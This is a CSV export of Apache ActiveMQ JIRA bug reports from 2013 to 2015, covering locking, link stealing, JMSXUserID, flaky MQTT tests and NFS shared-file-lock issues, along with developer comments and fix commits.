trunk;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
mKahaDB master slave needs lock when filtered adapter locks are created on the fly,AMQ-4729,12669553,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,19/Sep/13 20:54,19/Sep/13 21:09,14/Jul/23 05:43,19/Sep/13 21:09,5.8.0,,,,,5.9.0,,,Message Store,,,,0,,,,,,,,,"{code}<mKahaDB directory=""../kahadb"">
   <filteredPersistenceAdapters>
      <!-- kahaDB per destinations -->
      <filteredKahaDB perDestination=""true"" >
        <persistenceAdapter>
          <kahaDB journalMaxFileLength=""32mb"" />
        </persistenceAdapter>
      </filteredKahaDB>
    </filteredPersistenceAdapters>{code}
problem:

1. Starting the slave with an ""empty"" database, i.e no queues results in the slave trying to start and ultimately failing as the address is in use. There's now lock. Pushing a message to TEST.FOO and then starting the database works OK. The slave comes up and locks and waits.

2. Now, adding a TEST.FOO1 to the master. The master now has the two queues, TEST.FOO and TEST.FOO1. Kill the master and let the slave take over. The slave only sees TEST.FOO. Not TEST.FOO1.",,gtully,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,349485,,,Thu Sep 19 21:09:53 UTC 2013,,,,,,,,,,,"0|i1o9en:",349783,,,,,,,,,,,,,,,,,,,,,"19/Sep/13 20:54;gtully;a workaround is described at: https://issues.apache.org/jira/browse/AMQ-4365?focusedCommentId=13758262&page=com.atlassian.jira.plugin.system.issuetabpanels:comment-tabpanel#comment-13758262;;;","19/Sep/13 21:09;gtully;fix in http://git-wip-us.apache.org/repos/asf/activemq/commit/0f90695d

mKahaDB now has a lock (shared file by default) and suppresses the locks of filtered adapters;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Text information of ant producer durable option is not correct,AMQ-4726,12669009,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,cmoulliard,cmoulliard,17/Sep/13 13:06,18/Sep/13 18:37,14/Jul/23 05:43,18/Sep/13 18:37,,,,,,5.9.0,,,,,,,0,,,,,,,,,"The ant build.xml file of activemq reports that ""durable option"" will create a durable subscriber

{code}
     [echo]             ant producer <options> - Creates a producer publishing a number of messages
     [echo]
     [echo]             Producer Options:
     [echo]                             url - Used to specify acustom URL for the broker,
     [echo]                                   e.g., tcp://hostname:1234
     [echo]                           topic - A boolean to determine whether to use topics
     [echo] 		                        or queues
     [echo]                         subject - Used to specify a custom destination name,
     [echo]                                   e.g. MyDestination
     [echo]                         durable - A boolean to specify that you want to create
     [echo]                                   a durable topic subscriber?
{code}

Obviously, this is a mistake as the ""durable"" option for the producer allows to change DeliveryMode of the message ('PERSISTENT' or 'NON-PERSISTENT')

Maybe, we should use 'persistent' as property name but then the build.xml file and java class need to be changed",,cmoulliard,tabish,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,348941,,,Wed Sep 18 18:37:52 UTC 2013,,,,,,,,,,,"0|i1o61z:",349239,,,,,,,,,,,,,,,,,,,,,"18/Sep/13 18:37;tabish;Updated the verbiage to be clear what this options means to producers.  Didn't change the option name so as not to break current users.  ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
FailoverUriTest hangs ,AMQ-4725,12668952,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,kearls,kearls,17/Sep/13 07:18,18/Sep/13 14:27,14/Jul/23 05:43,18/Sep/13 14:27,,,,,,,,,Test Cases,,,,0,,,,,,,,,"The TestBadVersionNumberDoesNotWork and TestBadPropertyNameFails both hang when the init method adds the following:  

    addCombinationValues(""postfix"", new Object[] {"")?initialReconnectDelay=1000&maxReconnectDelay=1000""});

I'll attach a patch which comments these out so the build doesn't hang, as well as a stack trace.
",,kearls,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4718,,,,,,,,,,"17/Sep/13 07:21;kearls;AMQ-4725.patch;https://issues.apache.org/jira/secure/attachment/12603560/AMQ-4725.patch","17/Sep/13 07:28;kearls;AMQ-4725stack.txt;https://issues.apache.org/jira/secure/attachment/12603564/AMQ-4725stack.txt",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,348884,,,Wed Sep 18 14:27:53 UTC 2013,,,,,,,,,,,"0|i1o5pb:",349182,Regression,Unit Test Broken,,,,,,,,,,,,,,,,,,,"17/Sep/13 14:39;tabish;The changes to make options nested breaks these cases.  The nested options that are bad don't get caught and cause some other issues. ;;;","18/Sep/13 14:27;tabish;Fixed now, tests restored;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Build failure from fresh svn CO,AMQ-4722,12668207,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,udarakr,udarakr,12/Sep/13 06:35,12/Sep/13 07:43,14/Jul/23 05:43,12/Sep/13 07:43,5.8.0,,,,,,,,,,,,0,,,,,,,,,,UBUNTU 12.04,jbonofre,udarakr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,348141,,,Thu Sep 12 07:11:51 UTC 2013,,,,,,,,,,,"0|i1o14f:",348437,,,,,,,,,,,,,,,,,,,,,"12/Sep/13 07:11;jbonofre;ActiveMQ moved to git:

https://git-wip-us.apache.org/repos/asf?p=activemq.git;a=summary

So, svn co is no more useful. You have to do a git clone.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Enable ""Link Stealing"" as an option on a Connector",AMQ-4719,12667996,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,rajdavies,rajdavies,rajdavies,11/Sep/13 07:25,29/Jul/14 22:10,14/Jul/23 05:43,29/Jul/14 22:10,,,,,,5.10.0,5.11.0,5.9.1,Broker,,,,0,,,,,,,,,"The JMS Spec states that connecting with a duplicate ClientID should throw an Exception. However, for MQTT and AMQP specs ""Link Stealing"" where the last ClientID pushes out the older connection with the same ClientID should be supported. ActiveMQ supports link stealing for connections with a duplicate ConnectionID - though the ConnectionID is not something supported by MQTT or AMQP. Make Link Stealing optional - so it can be set on by default for MQTT and AMQP TransportConnectors",,davsclaus,dhirajsb,rajdavies,surfnerd,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,347931,,,Tue Jul 29 22:10:43 UTC 2014,,,,,,,,,,,"0|i1nztr:",348227,,,,,,,,,,,,,,,,,,,,,"11/Sep/13 08:22;rajdavies;Fixed on trunk;;;","11/Nov/13 17:25;rajdavies;The allowLinkProperty on the TransportConnector does not get set as passed in as an optional parameter to the TransportConnector;;;","13/Nov/13 06:56;rajdavies;Link Stealing is enabled now by default for MQTT transport(s) - 
AMQP is tricky - as enabling it will break JMS semantics for JMS over AMQP clients - so left to the user to decide - e.g. in the broker config enable link stealing:

<transportConnector name=""nio"" uri=""nio://0.0.0.0:61616?allowLinkStealing=true ""/>  ;;;","13/Nov/13 07:47;davsclaus;Rob do you mind adding some documentation notes about this new allowLinkStealing option?;;;","28/Jul/14 21:19;dhirajsb;This wasn't enabled for some reason for MQTTSslTransportFactory. I've fixed that and added a test case to verify that it works for MQTT. 
It looks like I don't have the appropriate permissions to re-open this issue or administer any ActiveMQ issues right now. I will send a request to the Apache PMC to fix that. ;;;","28/Jul/14 21:31;dhirajsb;The option was not set by default in MQTTSslTransportFactory. ;;;","28/Jul/14 21:44;surfnerd;[~dhirajsb] Hi Dhiraj. Can you please verify the same for websockets ? it's not working.

https://issues.apache.org/jira/browse/AMQ-5237;;;","29/Jul/14 02:20;dhirajsb;Hi Surf, can you try adding the allowLinkStealing attribute as mentioned at http://activemq.apache.org/configuring-transports.html in the transportConnector element in your broker.xml? ;;;","29/Jul/14 22:10;tabish;Updated tests now passing in Jenkins and on my local machine.  ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
populateJMSXUserID is not setting the JMSXUserID property on the JMS message in JMX,AMQ-4717,12667810,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,chirino,jsherman1,jsherman1,10/Sep/13 14:14,11/Sep/13 02:18,14/Jul/23 05:43,10/Sep/13 15:08,5.5.1,5.6.0,5.8.0,,,5.9.0,,,,,,,0,authentication,,,,,,,,"When setting the attribute populateJMSXUserID=""true"" as documented [1] the broker should populate the JMS message with the JMSXUserID property.  However, this is not the case.  

I have configured the broker to require authentication and sent a message to a Queue using the JMS producer shipped with the distribution.  The message is then inspected via JMX and the JMSXUserID property is not set.

[1] http://activemq.apache.org/jmsxuserid.html","OSX
java version ""1.7.0_25""",jsherman1,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,347746,,,Wed Sep 11 02:18:41 UTC 2013,,,,,,,,,,,"0|i1nypb:",348045,,,,,,,,,,,,,,,,,,,,,"10/Sep/13 15:08;chirino;The JMSXUserID was being set in the message but just not showing up when browsed via JMX.  I've applied fix so that JMSXUserID shows up in JMX too.;;;","10/Sep/13 16:42;jsherman1;After looking into this further it appears the JMSXUserID is added to the JMS message however:

1) It is not visible when browsing the message via JMX

2) The Message.propertyExists(String s) does not detect that the property is actually there.

Using message.getStringProperty(""JMSXUserID"") will return the value if the property is set.

The following method was used to test this:

        private void browse() throws Exception
	{
		ActiveMQConnectionFactory connectionFactory = new ActiveMQConnectionFactory(user, password, url);
        Connection connection = connectionFactory.createConnection();
		connection.start();
		
		Session session = connection.createSession(transacted, ackMode);

        Queue queue = session.createQueue(subject);

		QueueBrowser queueBrowser = session.createBrowser(queue);
        Enumeration enumeration = queueBrowser.getEnumeration();
        int received = 0;
        while (enumeration.hasMoreElements()) {
            Message message = (Message) enumeration.nextElement();

            System.out.println(""Browsing message "" + received+"": ""+message.getJMSMessageID());

            Enumeration propertyEnum = message.getPropertyNames();
            while(propertyEnum.hasMoreElements())
            {
                  System.out.println(""Found: ["" + propertyEnum.nextElement() + ""]"");
            }

            System.out.println(""JMSXUserID: "" + message.getStringProperty(""JMSXUserID""));

            if(message.propertyExists(""JMSXUserID"")){
				System.out.println(""JMSXUserID Exists"");
			}
			else{
				System.out.println(""JMSXUserID Not Found!"");
            }

	    }
      }

Which prints:

Browsing message 0: ID:fusepro.home-63724-1378830280448-1:1:1:1:1
Found: [JMSXUserID]
JMSXUserID: admin
JMSXUserID Not Found!

;;;","11/Sep/13 02:18;jsherman1;I have tested this against the latest 5.9 SNAPSHOT and see the propertyExists method is now working as designed:

Browsing message 0: ID:fusepro.home-51015-1378865317020-1:1:1:1:1
Found: [JMSXUserID]
JMSXUserID Exists
JMSXUserID: admin
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"If multiple MessageInterceptors are registered, a stack overflow can occur",AMQ-4714,12667303,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,rajdavies,rajdavies,rajdavies,06/Sep/13 12:25,06/Sep/13 13:27,14/Jul/23 05:43,06/Sep/13 13:27,5.9.0,,,,,5.9.0,,,Broker,,,,0,,,,,,,,,,,rajdavies,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,347240,,,Fri Sep 06 13:27:02 UTC 2013,,,,,,,,,,,"0|i1nvl3:",347539,,,,,,,,,,,,,,,,,,,,,"06/Sep/13 13:27;rajdavies;Fixed on trunk;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
org.apache.activemq.transport.amqp.JMSClientTest.testTXConsumerAndLargeNumberOfMessages fails,AMQ-4713,12666653,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,tabish,kearls,kearls,03/Sep/13 07:39,19/Sep/13 11:01,14/Jul/23 05:43,19/Sep/13 11:01,,,,,,5.9.0,,,Test Cases,,,,0,,,,,,,,,"This fails intermittently with one of the two errors shown below:

Running org.apache.activemq.transport.amqp.JMSClientTest
Tests run: 5, Failures: 1, Errors: 0, Skipped: 0, Time elapsed: 13.778 sec <<< FAILURE!
testTXConsumerAndLargeNumberOfMessages(org.apache.activemq.transport.amqp.JMSClientTest)  Time elapsed: 2.027 sec  <<< FAILURE!
java.lang.AssertionError: expected:<0> but was:<15>
	at org.junit.Assert.fail(Assert.java:88)
	at org.junit.Assert.failNotEquals(Assert.java:743)
	at org.junit.Assert.assertEquals(Assert.java:118)
	at org.junit.Assert.assertEquals(Assert.java:555)
	at org.junit.Assert.assertEquals(Assert.java:542)
	at org.apache.activemq.transport.amqp.JMSClientTest.testTXConsumerAndLargeNumberOfMessages(JMSClientTest.java:193)


Results :

Failed tests: 
  JMSClientTest.testTXConsumerAndLargeNumberOfMessages:193 expected:<0> but was:<15>

Tests run: 5, Failures: 1, Errors: 0, Skipped: 0


-------------------------------------------------------
 T E S T S
-------------------------------------------------------
Running org.apache.activemq.transport.amqp.JMSClientTest
Tests run: 5, Failures: 1, Errors: 0, Skipped: 0, Time elapsed: 40.032 sec <<< FAILURE!
testTXConsumerAndLargeNumberOfMessages(org.apache.activemq.transport.amqp.JMSClientTest)  Time elapsed: 18.031 sec  <<< FAILURE!
java.lang.AssertionError: Should receive message: 159
	at org.junit.Assert.fail(Assert.java:88)
	at org.junit.Assert.assertTrue(Assert.java:41)
	at org.junit.Assert.assertNotNull(Assert.java:621)
	at org.apache.activemq.transport.amqp.JMSClientTest.testTXConsumerAndLargeNumberOfMessages(JMSClientTest.java:181)
","mac os x, jdk7",jbonofre,kearls,tabish,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"19/Sep/13 09:07;kearls;AMQ-4713.patch;https://issues.apache.org/jira/secure/attachment/12604012/AMQ-4713.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,346591,,,Thu Sep 19 11:01:41 UTC 2013,,,,,,,,,,,"0|i1nrlj:",346892,Regression,Unit Test Broken,,,,,,,,,,,,,,,,,,,"11/Sep/13 13:00;jbonofre;With the latest update on trunk, I have the following result on activemq-amqp tests:

Failed tests:   testTXConsumerAndLargeNumberOfMessages(org.apache.activemq.transport.amqp.JMSClientTest): Should receive message: 191
;;;","19/Sep/13 09:07;kearls;As discussed in earlier email, the problem here is the way we were using delivery tags.  
;;;","19/Sep/13 11:01;tabish;Patch applied, tests passing now.  Thanks!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
MQTT unit tests fail,AMQ-4712,12666642,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,kearls,jbonofre,jbonofre,03/Sep/13 05:12,02/Apr/14 22:01,14/Jul/23 05:43,31/Mar/14 15:31,5.9.0,,,,,5.10.0,5.9.1,,MQTT,Test Cases,,,1,,,,,,,,,"Running org.apache.activemq.transport.mqtt.MQTTNioTest
Tests run: 19, Failures: 0, Errors: 2, Skipped: 0, Time elapsed: 160.808 sec <<< FAILURE!
Running org.apache.activemq.transport.mqtt.MQTTSSLTest
Tests run: 18, Failures: 0, Errors: 1, Skipped: 0, Time elapsed: 161.426 sec <<< FAILURE!
Running org.apache.activemq.transport.mqtt.MQTTTest
Tests run: 18, Failures: 0, Errors: 1, Skipped: 0, Time elapsed: 158.184 sec <<< FAILURE!

Results :

Tests in error:
  testPingOnMQTTNIO(org.apache.activemq.transport.mqtt.MQTTNioTest): The client id MUST be configured when clean session is set to false
  testReceiveMessageSentWhileOffline(org.apache.activemq.transport.mqtt.MQTTNioTest): String index out of range: -6
  testReceiveMessageSentWhileOffline(org.apache.activemq.transport.mqtt.MQTTSSLTest): Command from server contained an invalid message id: 1
  testReceiveMessageSentWhileOffline(org.apache.activemq.transport.mqtt.MQTTTest): Command from server contained an invalid message id: 1

Tests run: 55, Failures: 0, Errors: 4, Skipped: 0
",,adenysenko,ceposta,davsclaus,jbonofre,kearls,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"14/Nov/13 14:21;kearls;MQTTTest.testSendMQTTReceiveJMS.stack;https://issues.apache.org/jira/secure/attachment/12613834/MQTTTest.testSendMQTTReceiveJMS.stack",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,346580,,,Mon Mar 31 15:05:57 UTC 2014,,,,,,,,,,,"0|i1nrj3:",346881,,,,,,,,,,,,,,,,,,,,,"02/Oct/13 10:43;davsclaus;Yeah I got test failures also sometimes. But not consistent.;;;","02/Oct/13 10:45;davsclaus;-------------------------------------------------------
 T E S T S
-------------------------------------------------------
Running org.apache.activemq.transport.mqtt.MQTTNioTest
Tests run: 20, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 44.976 sec
Running org.apache.activemq.transport.mqtt.MQTTSSLTest
Tests run: 18, Failures: 0, Errors: 1, Skipped: 0, Time elapsed: 42.161 sec <<< FAILURE!
Running org.apache.activemq.transport.mqtt.MQTTTest
Tests run: 18, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 41.016 sec

Results :

Tests in error:
  testReceiveMessageSentWhileOffline(org.apache.activemq.transport.mqtt.MQTTSSLTest): Command from server contained an invalid message id: 1

Tests run: 56, Failures: 0, Errors: 1, Skipped: 0;;;","03/Oct/13 07:09;davsclaus;Rob did you have hours to spare to look into MQTT test failures?

Would be good to get this fixed for the 5.9 release.
Also if there is some issues on the mqtt-client side you can get that fixed and a new release out.;;;","09/Oct/13 04:23;ceposta;Hey JB, can you re-run the tests? I think *at least one (the first one)* of them should be fixed now.

When I run the tests, I can only get the one Claus posted about to fail. Let us know what you find.;;;","09/Oct/13 04:33;jbonofre;Thanks for the update. Let me try again.

I keep you posted.;;;","11/Oct/13 06:40;ceposta;Guys, I took a look at this tonight. Goes deep... I won't have time to continue looking at it for a few days because i'll be with family, but if someone else wants to pick it up, here's what I found..

Somehow, the MQTT client is seeing two SUBACK frames for the same messageId (as indicated from the error: Command from server contained an invalid message id: 1). The broker logs that it only sends it once.  

So I took a peak at the SSLTransport and MQTTProtocolCodec... seems things are okay in that the next action is advanced properly from header to body, but for some reason, the readBuffers actually do have two instances of the SUBACK frame....

Digging deeper, it seems the SSL Transport is ""reading"" those frames off the wire, but I suspect incorrectly. It *might* have some issues w/ how it deals with buffer underflow/overflow, but I couldn't pin it down for sure.

If nobody else gets to it, i'll pick it up later this weekend when I get a sec.  ;;;","11/Oct/13 13:28;tabish;I've seen this on all the transports not just SSL transport, all the MQTT tests will fail with this extra SUBACK packet from time to time.;;;","14/Nov/13 14:20;kearls;I just saw a case where testSendMQTTReceiveJMS hung on one of the CI boxes.  I'll attach a stack trace.
;;;","21/Jan/14 14:11;kearls;Added @Ignore to testReceiveMessageSentWhileOffline in both MQTTSSLTest and MQTTNioTest as both were failing regularly on CI.
;;;","31/Mar/14 15:05;tabish;@Kevin I think you can probably close this one now, the tests all seem pretty stable for MQTT;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
totalMessageCount stat is not properly updated when destination is removed,AMQ-4711,12666588,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,dejanb,dejanb,02/Sep/13 14:17,03/Sep/13 08:26,14/Jul/23 05:43,03/Sep/13 08:26,5.8.0,,,,,5.9.0,,,,,,,0,,,,,,,,,"When we remove a destination using JMX the appropriate parent statistics object is not properly updated, leading to wrong message count statistics.",,dejanb,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,346526,,,Tue Sep 03 08:26:26 UTC 2013,,,,,,,,,,,"0|i1nr73:",346827,,,,,,,,,,,,,,,,,,,,,"03/Sep/13 08:26;dejanb;Fixed with git commit a0c1781c4;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add keep alive support to shared file locker,AMQ-4705,12666328,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,30/Aug/13 14:19,14/Oct/15 14:19,14/Jul/23 05:43,03/Jul/15 11:40,5.8.0,,,,,5.12.0,,,Message Store,,,,0,kahadb,netapp,nfsv4,shared-file-lock,,,,,"issue on nsfv4 with a master slave configuration, where both the slave and the master could obtain a lock.
The following events occurred:

* master locks the file - does no more i/o to it – it's passive wrt the lock
* slave asks every 10 seconds if it can get the lock nfs come back and say no, someone has it
* nfs dies not nicely
 ** nfsv4 is stateful - no callback for locks. 
 ** It has a grace period of 30 seconds to let all clients that had locks reclaim them as locked
* master does not realize it needs to reclaim the lock and continues under the assumption it has the lock.
* After 30 sec grace period, slave comes in and asks for the lock and it receives it.",,gmurthy,gtully,jira-bot,tmielke,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-5568,,,,,,,,,,,,,AMQ-5549,,,"12/May/15 18:04;gmurthy;AMQ-4705-GMURTHY-PATCH.TXT;https://issues.apache.org/jira/secure/attachment/12732306/AMQ-4705-GMURTHY-PATCH.TXT","12/May/15 18:04;gmurthy;KahaDBDeleteLockTest.java;https://issues.apache.org/jira/secure/attachment/12732307/KahaDBDeleteLockTest.java",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,346267,,,Wed Oct 14 14:19:44 UTC 2015,,,,,,,,,,,"0|i1nplr:",346568,,,,,,,,,,,,,,,,,,,,,"30/Aug/13 14:21;gtully;currently keepAlive is a no op for the shared file locker. It does not delegate to channel fileLock isValid so it does not see any failure of even the acquisition by the slave.
having it check validity will help in this case and cause the master to die.;;;","02/Sep/13 23:55;gtully;fix in http://git-wip-us.apache.org/repos/asf/activemq/commit/0525f886;;;","03/Sep/13 21:01;gtully;use error for log message and check for file.exists

https://git-wip-us.apache.org/repos/asf?p=activemq.git;a=commit;h=74b35bc5dd75edb9d9e3250a4362b85d78023d76;;;","06/Feb/15 13:05;tmielke;Kind of follow up problem: AMQ-5568;;;","12/May/15 14:35;gtully;The check for file existence is not bullet proof, b/c a slave can recreate the file if it is deleted and the master can still think it is valid.
This needs some more thought.;;;","12/May/15 18:02;gmurthy;Checking of the file exists and comparing the lastModified date  (time since epoch) of the lock file should take care of the following cases. 

1. Single broker configuration -The lock file is deleted - The file.exists() returns false and the broker stops
2. A master slave broker configuration - The master starts up, creates the lock file and locks it. The slave broker is constantly polling to see if it can obtain a lock. Now, the lock file is deleted, the slave starts up as the master (polling times specified by the lockKeepAlivePeriod and lockAcquireSleepInterval) and the master compares the date modified on the lock file and then shuts down.

Please see attachment .
;;;","12/May/15 22:23;gtully;patch applied with thanks in http://git-wip-us.apache.org/repos/asf/activemq/commit/ccbbecb4;;;","14/Oct/15 14:19;jira-bot;Commit b285d1018803ceb4fdf7ea14c178de1e0abc9c8a in activemq's branch refs/heads/master from [~gtully]
[ https://git-wip-us.apache.org/repos/asf?p=activemq.git;h=b285d10 ]

https://issues.apache.org/jira/browse/AMQ-4705 - ensure jvm lock system property is cleared in the event of lock release throwing exception.
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
